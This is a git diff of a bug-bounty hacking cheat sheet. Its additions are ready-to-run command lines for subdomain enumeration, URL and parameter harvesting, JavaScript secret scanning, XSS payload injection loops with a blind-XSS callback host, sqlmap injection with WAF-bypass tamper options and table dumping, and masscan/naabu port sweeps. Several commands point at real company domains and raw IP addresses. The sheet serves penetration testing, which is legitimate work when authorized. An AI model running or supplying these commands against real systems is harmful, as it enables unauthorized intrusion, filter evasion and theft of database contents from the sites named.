@@ -7,6 +7,8 @@ LinkedIn :-https://www.linkedin.com/in/wadgamer10
 
 ## Recon :-
 
+# subdomain Enumeration :- passive 
+
 - subfinder
 
 subfinder -dL domains.txt -o subfinder.txt
@@ -19,6 +21,16 @@ subfinder -d inholland.nl -o subfinder.txt
 go install -v github.com/OWASP/Amass/v3/...@master
 
 amass enum -passive -norecursive -noalts -df domains.txt -o amass.txt
+
+- assetfinder
+
+echo test.com | assetfinder --subs-only >> asset.txt;
+
+
+python github-subdomains.py -t your-github-token -d test.com | grep -v '@' | sort -u | grep "\.test.com" >> github-subs.txt
+
+
+curl -s https://crt.sh/?q=%25.test.com | grep test.com | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u >> crt.txt
 
 
 - crtfinder
@@ -37,27 +49,74 @@ sublist3r -d safesavings.com -o sublist3r.txt
 
 - # Merging subdomains into one file :- all-subs.txt
 
-cat amass.txt subfinder.txt gobuster_subs.txt other.txt | anew all-subs.txt
+cat subfinder.txt amass.txt asset.txt github-subs.txt crt.txt | anew all-subs.txt
 
 
 - cat all-subs.txt | httpx -o live-subs.txt
 
 
-- cat live-subs.txt | dirsearch --stdin 
+- cat live-subs.txt | dirsearch --stdin
 
 
-- also ffuf :-
 
-ffuf -u https://www.workramp.com/FUZZ -w wordlist.txt -mc 200,403,301,302 -c true -v -o output.txt
+
+# subdomain Enumeration :- active :-
+
+Bruteforcing #subdomains using a wordlist :-
+
+
+ffuf -u "https://FUZZ.kaggle.com" -w best-dns-wordlist.txt -mc 200,403,404,302,301
+
+
+gobuster dns -d test.com -t 50 -w 2m-subdomains.txt -q -o g.txt
+
+
+puredns bruteforce Subdomain.txt test.com resolvers.txt
+
+
+wordlists :- https://wordlists.assetnote.io/
+
+
+
+# Script :-
+
+
+#!/bash/bin
+
+for url in $(cat domains.txt); do  #create domains.txt file contains your domains (many domains).
+
+subfinder -d $url -all >> subfinder.txt;
+
+amass enum -passive -norecursive -noalts -d $url >> amass.txt;
+
+echo $url | assetfinder --subs-only >> asset.txt;
+
+python github-subdomains.py -t your-github-token -d $url | grep -v '@' | sort -u | grep "\.$url" >> github-subs.txt
+
+ curl -s https://crt.sh/?q=%25.$url | grep $url | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u >> crt.txt
+
+done
+
+ cat subfinder.txt amass.txt asset.txt github-subs.txt crt.txt | anew all-subs.txt
+
+ rm -r subfinder.txt amass.txt asset.txt crt.txt
+
+ cat all-subs.txt | httpx -o live-subs.txt
+
+ #rm -r all-subs.txt
+
+
+ # Result all-subs.txt and live-subs.txt and github-subs.txt
+
+
+
+
+
 
 ----------------------------------------------------------------------------------------------
 
 
 ## Subdomain Takeover :-
-
-1- Recon (live-subs.txt)
-
-2- Testing :-
 
 
 1- Nuclei :-
@@ -76,7 +135,9 @@ ffuf -u https://www.workramp.com/FUZZ -w wordlist.txt -mc 200,403,301,302 -c tru
 - subzy run --target test.google.com,https://test.yahoo.com
 
 ------------------------------------------------------------------------------------
-## collecting urls and Parameters :-
+
+
+## Collecting urls and Parameters :-
 
 #Getting urls :- waymore tool (Mazing tool collecting urls from different resources)
 
@@ -102,6 +163,48 @@ cat live-urls.txt | grep "=" > live-parameters.txt
 
 waymore tool link :-
 https://github.com/xnl-h4ck3r/waymore
+
+
+
+Script :-
+
+
+#!/bash/bin
+
+for d in $(cat target.txt); do   #create target.txt file contains :- test.com
+
+waybackurls $d >> wayback.txt
+
+echo $d | gau >> gau.txt
+
+paramspider -d $d
+
+python github-endpoints.py -t your-github-token -d $d >> github-urls.txt
+
+done
+
+cat wayback.txt gau.txt results/*.txt github-urls.txt > f.txt
+
+cat f.txt | grep "=" > urls.txt
+
+cat urls.txt | httpx -silent -o p.txt
+
+cat p.txt | uro > params.txt
+
+################################
+
+cat f.txt | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt
+
+rm -r wayback.txt gau.txt results/*.txt
+rm -r urls.txt
+rm -r p.txt
+rm -r f.txt
+
+
+# Result :- params.txt and js-files.txt and github-urls.txt
+
+
+
 __________________________________________________________________________________________________
 
 ## virtual Host scanner :-
@@ -115,19 +218,33 @@ ________________________________________________________________________________
 
 ## JS Hunting :-
 
+--- Collecting :-
 
-1- ﻿echo target.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
+1- katana -u https://www.example.com | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt
+
+2- echo example.com | gau | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt -a
+
+3- cat waymore.txt | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt -a
 
 
-2- echo uber.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
+--- Scanning :-
+
+1- cat js-files.txt | jscracker | tee jscracker-result.txt
+
+2- nuclei -l js-files.txt -t /root/nuclei-templates/http/exposures/ | tee nuclei-result.txt
+
+3- JSS-Scanner :-  python3 JSScanner.py 
+
+4- Pinkerton :- python3 main.py -u https://example.com | tee pinkerton-result.txt
 
 
-3- JSS-Scanner :-
 
-- echo "invisionapp.com" | waybackurls | grep -iE '\.js'|grep -ivE '\.json'|sort -u  > j.txt
 
-- python3 JSScanner.py
 
+
+go install github.com/Ractiurd/jscracker@latest
+
+go install github.com/projectdiscovery/katana/cmd/katana@latest
 
 __________________________________________________________________________________________________
 
@@ -218,9 +335,35 @@ ________________________________________________________________________________
 
 - python3 paramspider.py --domain indrive.com
 
-- python3 paramspider.py --domain https://cpcalendars.cartscity.com --exclude woff,css,js,png,svg,php,jpg --output g.txt
+- python3 paramspider.py --domain https://www.vendasta.com --exclude woff,css,png,svg,jpg --output t.txt
 
-- cat indrive.txt | kxss  ( looking for reflected :-  "<> )
+- cat indrive.txt | kxss  ( looking for reflected :-  "<> )
+
+
+cat output/t.txt | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt
+
+
+
+cat params.txt | Gxss -c 100 -p Xss | sort -u | dalfox pipe
+
+
+echo "pintu.co.id" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
+
+
+
+
+- waybackurls youneedabudget.com | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done
+
+
+- dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht
+ 
+- dalfox file urls.txt -b https://hahwul.xss.ht
+
+  
+
+- echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
+
+- cat urls.txt | Gxss -c 100 -p XssReflected
 
 
 ## Looking for Hidden parameters :-
@@ -230,22 +373,17 @@ ________________________________________________________________________________
 - arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt
 
 
-- waybackurls youneedabudget.com | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done
 
-
-- dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht
-
-- dalfox file urls.txt -b https://hahwul.xss.ht
-
-
-- echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
-
-- cat urls.txt | Gxss -c 100 -p XssReflected
 
 __________________________________________________________________________________________________
 
-
 ## Sql Injection :-
+
+
+sqlmap -m s.txt --level 1 --random-agent --batch --dbs
+
+sqlmap -m s.txt --level 1 --random-agent --batch --tamper="space2comment" --dbs
+
 
 
 - echo https://www.recreation.gov | waybackurls | grep "\?" | uro | httpx -silent > param.txt
@@ -255,47 +393,53 @@ ________________________________________________________________________________
 - sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
 
 
-- sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2
+- sqlmap -u https://3.65.104.18/index.php --dbs --forms --crawl=2
 
 
-# Waf Bypass techniques Using Sqlmap :-
-
---dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump
+- sqlmap -u "http://www.example.com/submit.php" --data="search=hello&value=submit"
 
 
---tamper=space2comment --level=5 --risk=3
+## Test POST Requests for SQL Injection Vulnerabilities :-
+
+sqlmap -u "https://3.65.104.18/index.php/index/loginpopupsave
+" --data "username=2&password=3" -p "username,password" --method POST
 
 
---technique=B
-
-
---level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
-
-
---random-agent --dbms=MYSQL --dbs --technique=B
-
--v3 --technique=T --no-cast --fresh-queries --banner
-
-
-tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+sqlmap -r request.txt -p login --dbms="MySQL" --force-ssl --level 5 --risk 3 --dbs --hostname
 
 
 ## SQLi One Linear :-
 
 - cat target.com | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
 
+
 - subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
 
 
 ## Dump-Data :-
 
-- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)
+- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)
 
 - sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )
 
 - sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )
 
 - sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users
+
+
+
+# Waf Bypass techniques Using Sqlmap :-
+
+--batch --random-agent --tamper="space2comment" --level=5 --risk=3 --threads=10 --dbs
+
+
+--level=5 --risk=3 --random-agent -v3 --tamper="between,randomcase,space2comment" --dbs
+
+--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+
+-v3 --technique U --tamper="space2mysqlblank.py" --dbs
+
+-v3 --technique U --tamper="space2comment" --dbs
 
 __________________________________________________________________________________________________
 
@@ -362,7 +506,29 @@ cat CORS-domain.txt | CORS-Scanner
 
 ________________________________________________________________________________________________
 
-## Nmap Scanning :-
+
+## Port scanning :-
+
+
+## Masscan :-
+
+masscan -p0-79,81-442,444-65535 -iL live-ips.txt --rate=10000 -oB temp
+
+masscan --readscan temp | awk '{print $NF":"$4}' | cut -d/ -f1 > open-ports.txt
+
+
+
+## Naabu :-
+
+naabu -rate 10000 -l live-hosts.txt -silent
+
+naabu -rate 10000 -host cvo-abrn-stg.sys.comcast.net -silent
+
+
+
+## Nmap :-
+
+#- nmap -Pn -sV -iL live-hosts.txt -oN scaned-port.txt --script=vuln
 
 #- nmap -sS -p- 192.168.1.4  (-sS) Avoid Firewell && Connection Log.
 
